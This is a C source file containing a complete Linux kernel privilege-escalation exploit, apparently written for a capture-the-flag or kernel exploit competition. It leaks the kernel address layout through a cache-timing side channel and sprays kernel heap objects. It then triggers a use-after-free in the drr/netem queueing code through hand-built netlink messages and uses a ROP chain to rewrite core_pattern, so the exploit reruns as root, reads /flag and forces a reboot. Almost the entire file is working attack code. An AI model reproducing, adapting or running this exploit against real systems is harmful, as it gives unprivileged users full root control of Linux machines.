#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <err.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/if.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/sendfile.h>
#include <linux/membarrier.h>
#include <linux/netlink.h>
typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

u64 ktext = 0xffffffff81000000UL;
const char fake_core_pattern[] = "|/proc/%P/fd/666 %P";

char payload[0x1000];
char spray_data[0x1000];
char buf[0x1000];

int membarrier(int cmd, unsigned int flags, int cpu_id)
{
    return syscall(SYS_membarrier, cmd, flags, cpu_id);
}

inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
    uint64_t a, d;
    asm volatile (
        "mfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "xor %%rax, %%rax\n\t"
        "lfence\n\t"
        : "=r" (d), "=r" (a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d<<32) | a;
    return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
    uint64_t a, d;
    asm volatile(
        "xor %%rax, %%rax\n\t"
        "lfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
        : "=r" (d), "=r" (a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d<<32) | a;
    return a;
}

inline __attribute__((always_inline)) void prefetch(void *p)
{
    asm volatile (
        "prefetchnta (%0)\n"
        "prefetcht2 (%0)\n"
        : : "r" (p));
}

u64 flushandreload(void *addr)
{
    u64 time = rdtsc_begin();
    prefetch(addr);
    u64 delta = rdtsc_end() - time;
    return delta;
}

unsigned long leak_kaslr(unsigned long base)
{
    if (!base) {
      #ifdef KASLR_BYPASS_INTEL
        #define OFFSET 0
        #define START (0xffffffff81000000ull + OFFSET)
        #define END   (0xffffffffD0000000ull + OFFSET)
        #define STEP   0x0000000001000000ull
        while (1) {
            unsigned long bases[7] = {0};
            for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
                unsigned long times[(END - START) / STEP] = {};
                unsigned long addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (unsigned long)ti;
                }

                for (int i = 0; i < 16; i++) {
                    for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                        unsigned long addr = addrs[ti];
                        unsigned long t = flushandreload((void*)addr);
                        if (t < times[ti]) {
                            times[ti] = t;
                        }
                    }
                }

                unsigned long minv = ~0;
                unsigned long mini = -1;
                for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++) {
                    if (times[ti] < minv) {
                        mini = ti;
                        minv = times[ti];
                    }
                }

                if (mini < 0) {
                    return -1;
                }

                bases[vote] = addrs[mini];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
                if (c == 0) {
                    base = bases[i];
                } else if (base == bases[i]) {
                    c++;
                } else {
                    c--;
                }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
                if (base == bases[i]) {
                    c++;
                }
            }
            if (c > ARRAY_LEN(bases) / 2) {
                base -= OFFSET;
                goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %lx with %d votes\n", base, c);
        }
      #else
        #define START (0xffffffff81000000ull)
        #define END (0xffffffffc0000000ull)
        #define STEP 0x0000000000200000ull
        #define NUM_TRIALS 7
        // largest contiguous mapped area at the beginning of _stext
        #define WINDOW_SIZE 11

        while (1) {
            unsigned long bases[NUM_TRIALS] = {0};

            for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
                unsigned long times[(END - START) / STEP] = {};
                unsigned long addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (unsigned long)ti;
                }

                for (int i = 0; i < 16; i++) {
                    for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                        unsigned long addr = addrs[ti];
                        unsigned long t = flushandreload((void*)addr);
                        if (t < times[ti]) {
                            times[ti] = t;
                        }
                    }
                }

                unsigned long max = 0;
                int max_i = 0;
                for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++) {
                    unsigned long sum = 0;
                    for (int i = 0; i < WINDOW_SIZE; i++) {
                        sum += times[ti + i];
                    }
                    if (sum > max) {
                        max = sum;
                        max_i = ti;
                    }
                }

                bases[vote] = addrs[max_i];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
                if (c == 0) {
                    base = bases[i];
                } else if (base == bases[i]) {
                    c++;
                } else {
                    c--;
                }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
                if (base == bases[i]) {
                    c++;
                }
            }
            if (c > ARRAY_LEN(bases) / 2) {
                goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %lx with %d votes\n", base, c);
        }
      #endif
    }

got_base:
    return base;
}

void pin_on_cpu(int i)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];
    SYSCHK(unshare(CLONE_NEWNET | CLONE_NEWUSER));
    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);
    
    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
}

// =======================================================================
#define WRITE_RANDOM_THREADS 100
#define WRITE_RANDOM_SIZE 0x100000ul
int random_fd;
int write_random_cfd[2];
unsigned long *random_data;

void *write_random_job(void *dummy)
{
    pin_on_cpu(1);
    
    write(write_random_cfd[0], buf, 1);
    read(write_random_cfd[0], buf, 1);
    
    write(random_fd, random_data, WRITE_RANDOM_SIZE);
    sleep(-1);
}

void setup_write_random()
{
    pthread_t tid;

    SYSCHK(random_fd = open("/dev/random", O_WRONLY));
    
    SYSCHK(random_data = mmap(NULL, WRITE_RANDOM_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0));
    for (int i = 0; i < WRITE_RANDOM_SIZE / 8; i++)
        random_data[i] = ktext + 0x04d27c7UL; // 0xffffffff814d27c7 : push rdi ; pop rsp ; ret

    socketpair(AF_UNIX, SOCK_STREAM, 0, write_random_cfd);

    for (int i = 0; i < WRITE_RANDOM_THREADS; i++) {
        pthread_create(&tid, 0, write_random_job, NULL);
    }

    read(write_random_cfd[1], buf, WRITE_RANDOM_THREADS);
}

// =======================================================================

#define DRAIN_KMALLOC1K_THREADS 64
int drain_kmalloc1k_cfd[2];
int drain_kmalloc1k_sfds[DRAIN_KMALLOC1K_THREADS][2];

void *drain_kmalloc1k_job(void *x)
{
    size_t idx = (size_t)x;
    pin_on_cpu(0);
    
    write(drain_kmalloc1k_cfd[0], buf, 1);
    read(drain_kmalloc1k_cfd[0], buf, 1);

    struct iovec iov = { buf, 0x1000 };
    struct msghdr mhdr = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = spray_data,
        .msg_controllen = 513, // drain kmalloc-1k
    };
    sendmsg(drain_kmalloc1k_sfds[idx][1], &mhdr, 0);
}

void setup_drain_kmalloc1k()
{
    pthread_t tid;
    const int n = 0x800;
    struct cmsghdr *cmsghdr;
    
    memset(spray_data, 0, sizeof(spray_data));
    cmsghdr = (struct cmsghdr *)spray_data;
    cmsghdr->cmsg_len = 513;
    cmsghdr->cmsg_level = 0x6969;
    
    socketpair(AF_UNIX, SOCK_STREAM, 0, drain_kmalloc1k_cfd);
    
    for (int i = 0; i < DRAIN_KMALLOC1K_THREADS; i++) {
        SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, drain_kmalloc1k_sfds[i]));
        setsockopt(drain_kmalloc1k_sfds[i][1], SOL_SOCKET, SO_SNDBUF, (char *)&n, sizeof(n));
        setsockopt(drain_kmalloc1k_sfds[i][0], SOL_SOCKET, SO_RCVBUF, (char *)&n, sizeof(n));
        write(drain_kmalloc1k_sfds[i][1], buf, 0x1000);
    }

    for (int i = 0; i < DRAIN_KMALLOC1K_THREADS; i++) {
        pthread_create(&tid, 0, drain_kmalloc1k_job, (void*)(size_t)i);
    }
    
    read(drain_kmalloc1k_cfd[1], buf, DRAIN_KMALLOC1K_THREADS);
}

// =======================================================================
int reclaim_UAF_qdisc_cfd[2];
int reclaim_UAF_qdisc_sfd[2];

void *reclaim_UAF_qdisc_job(void *dummy)
{
    pin_on_cpu(0);
    
    write(reclaim_UAF_qdisc_cfd[0], buf, 1);
    read(reclaim_UAF_qdisc_cfd[0], buf, 1);

    struct iovec iov = { buf, 0x1000 };
    struct msghdr mhdr = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = payload,
        .msg_controllen = 513,
    };
    sendmsg(reclaim_UAF_qdisc_sfd[1], &mhdr, 0);
    sleep(-1);
}

void setup_reclaim_UAF_qdisc()
{
    pthread_t tid;
    const int n = 0x800;
    
    *(u64 *)&payload[0x00] = ktext + 0x00cc407UL; // 0xffffffff810cc407 : pop rdi ; ret
    *(u64 *)&payload[0x08] = ktext + 0x2db6560UL; // 0xffffffff83db6560 : &core_pattern
    *(u64 *)&payload[0x10] = ktext + 0x001ef41UL; // 0xffffffff8101ef41 : pop rsi ; ret (pop dummy data)
    *(u64 *)&payload[0x20] = ktext + 0x001ef41UL; // 0xffffffff8101ef41 : pop rsi ; ret
    *(u64 *)&payload[0x28] = (u64)&fake_core_pattern;

    *(u64 *)&payload[0x30] = ktext + 0x08aac40UL; // 0xffffffff818aac40 : pop rdx ; xor eax, eax ; ret
    *(u64 *)&payload[0x38] = 0x30;
    *(u64 *)&payload[0x40] = ktext + 0x09ab240UL; // 0xffffffff819ab240 : _copy_from_user()
    *(u64 *)&payload[0x48] = ktext + 0x00cc407UL; // 0xffffffff810cc407 : pop rdi ; ret
    *(u64 *)&payload[0x50] = 0x10000000;
    *(u64 *)&payload[0x58] = ktext + 0x027aed0UL; // 0xffffffff8127aed0 : msleep()
    *(u64 *)&payload[0x18] = ktext + 0x2e85030UL; // 0xffffffff83e85030 : &input_pool->hash.buf
    
    socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_UAF_qdisc_cfd);

    SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, reclaim_UAF_qdisc_sfd));
    setsockopt(reclaim_UAF_qdisc_sfd[1], SOL_SOCKET, SO_SNDBUF, (char *)&n, sizeof(n));
    setsockopt(reclaim_UAF_qdisc_sfd[0], SOL_SOCKET, SO_RCVBUF, (char *)&n, sizeof(n));
    write(reclaim_UAF_qdisc_sfd[1], buf, 0x1000);

    pthread_create(&tid, 0, reclaim_UAF_qdisc_job, NULL);
    
    read(reclaim_UAF_qdisc_cfd[1], buf, 1);
}


int tcp_client_sockfd;
int tcp_server_sockfd;

void setup_tcp_server()
{
    struct sockaddr_in sockaddr = {
        .sin_family = AF_INET,
        .sin_port = htons(1234),
    };
    inet_pton(AF_INET, "127.0.0.1", &sockaddr.sin_addr);
    
    SYSCHK(tcp_server_sockfd = socket(AF_INET, SOCK_STREAM, 0));
    SYSCHK(setsockopt(tcp_server_sockfd, SOL_SOCKET, SO_BINDTODEVICE, "lo", strlen("lo")));
    SYSCHK(bind(tcp_server_sockfd, (struct sockaddr *)&sockaddr, sizeof(sockaddr)));
    SYSCHK(listen(tcp_server_sockfd, 1));
}

void setup_tcp_sockfd()
{
    int priority = 0x10001;
    struct sockaddr_in sockaddr = {
        .sin_family = AF_INET,
        .sin_port = htons(1234),
    };
    inet_pton(AF_INET, "127.0.0.1", &sockaddr.sin_addr);

    SYSCHK(tcp_client_sockfd = socket(AF_INET, SOCK_STREAM, 0));
    SYSCHK(setsockopt(tcp_client_sockfd, SOL_SOCKET, SO_BINDTODEVICE, "lo", strlen("lo")));
    SYSCHK(setsockopt(tcp_client_sockfd, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority)));
    SYSCHK(connect(tcp_client_sockfd, (struct sockaddr *)&sockaddr, sizeof(sockaddr)));
}

void send_tcp_pkt()
{
    write(tcp_client_sockfd, "A", 1);
}

struct sockaddr_in udp_addr_dst;
int udp_client_sockfd;
void setup_udp_sockfd()
{
    int priority = 0x10001;

    SYSCHK(udp_client_sockfd = socket(AF_INET, SOCK_DGRAM, 0));
    SYSCHK(setsockopt(udp_client_sockfd, SOL_SOCKET, SO_BINDTODEVICE, "lo", strlen("lo")));
    SYSCHK(setsockopt(udp_client_sockfd, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority)));

    udp_addr_dst.sin_family = AF_INET;
    udp_addr_dst.sin_port = htons(1234);
    inet_pton(AF_INET, "127.0.0.1", &udp_addr_dst.sin_addr);
}

void send_udp_pkt()
{
    SYSCHK(sendto(udp_client_sockfd, "A", 1, 0, (struct sockaddr *)&udp_addr_dst, sizeof(udp_addr_dst)));
}

void setup_core_pattern_monitor()
{
    pin_on_cpu(1);
    setsid();

    int memfd = memfd_create("", 0);
    char buf[0x100] = {};

    // Duplicate the exploit binary to memfd 666.
    sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff);
    dup2(memfd, 666);
    close(memfd);

    // Poll the core_pattern content and trigger segfault if it is modified.
    while (1) {
        int corefd = open("/proc/sys/kernel/core_pattern", O_RDONLY);
        read(corefd, buf, sizeof(buf));
        close(corefd);
        if (strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0)
            break;
        sleep(1);
    }
    *(unsigned long *)0 = 0;
}

// ip link set lo up
unsigned char p1[] = {0x20,0x00,0x00,0x00,0x10,0x00,0x05,0x00,0x84,0x2b,0x69,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00};
// tc qdisc add dev lo root handle 1: drr
unsigned char p2[] = {0x2c,0x00,0x00,0x00,0x24,0x00,0x05,0x06,0x89,0x2b,0x69,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x08,0x00,0x01,0x00,0x64,0x72,0x72,0x00};
// tc class add dev lo parent 1: classid 1:1 drr quantum 1500
unsigned char p3[] = {0x38,0x00,0x00,0x00,0x28,0x00,0x05,0x06,0x8b,0x2b,0x69,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x01,0x00,0x64,0x72,0x72,0x00,0x0c,0x00,0x02,0x00,0x08,0x00,0x01,0x00,0xdc,0x05,0x00,0x00};
// tc qdisc add dev lo parent 1:1 handle 2: netem delay 1ms limit 100
unsigned char p4[] = {0x58,0x00,0x00,0x00,0x24,0x00,0x05,0x06,0x8f,0x2b,0x69,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x0a,0x00,0x01,0x00,0x6e,0x65,0x74,0x65,0x6d,0x00,0x00,0x00,0x28,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x64,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x0a,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
// tc qdisc add dev lo parent 2: drr
unsigned char p5[] = {0x2c,0x00,0x00,0x00,0x24,0x00,0x05,0x06,0x92,0x2b,0x69,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x01,0x00,0x64,0x72,0x72,0x00};
// tc class del dev lo parent 1: classid 1:1 drr
unsigned char p6[] = {0x30,0x00,0x00,0x00,0x29,0x00,0x05,0x00,0xa9,0x2b,0x69,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x01,0x00,0x64,0x72,0x72,0x00,0x04,0x00,0x02,0x00};

int main(int argc, char *argv[])
{
    int nl_sockfd;
    int ret;

    if (argc > 1) {
        int pid = strtoull(argv[1], 0, 10);
        int pfd = syscall(SYS_pidfd_open, pid, 0);
        int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
        dup2(stdoutfd, 1);
        
        system("cat /flag;echo o>/proc/sysrq-trigger");
        execlp("bash", "bash", NULL);
    }

    if (fork() == 0) {
        setup_core_pattern_monitor();
    }

    ktext = leak_kaslr(0);

    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    unshare_setup(getuid(), getgid());
    setup_write_random();
    setup_drain_kmalloc1k();
    setup_reclaim_UAF_qdisc();

    SYSCHK(nl_sockfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE));
    SYSCHK(write(nl_sockfd, p1, sizeof(p1))); // enable "lo" device
    
    setup_tcp_server();
    setup_tcp_sockfd();
    setup_udp_sockfd();

    // === exploit start ===
    pin_on_cpu(0);
    write(drain_kmalloc1k_cfd[1], buf, DRAIN_KMALLOC1K_THREADS);
    SYSCHK(write(nl_sockfd, p2, sizeof(p2)));
    SYSCHK(write(nl_sockfd, p3, sizeof(p3)));
    SYSCHK(write(nl_sockfd, p4, sizeof(p4)));
    SYSCHK(write(nl_sockfd, p5, sizeof(p5)));

    send_udp_pkt();

    SYSCHK(write(nl_sockfd, p6, sizeof(p6)));

    membarrier(MEMBARRIER_CMD_GLOBAL, 0, -1); // wait RCU
    
    write(reclaim_UAF_qdisc_cfd[1], buf, 1);
    usleep(500);
    
    write(write_random_cfd[1], buf, WRITE_RANDOM_THREADS);
    usleep(500);
    
    send_tcp_pkt();

    while (1);
    return 0;
}
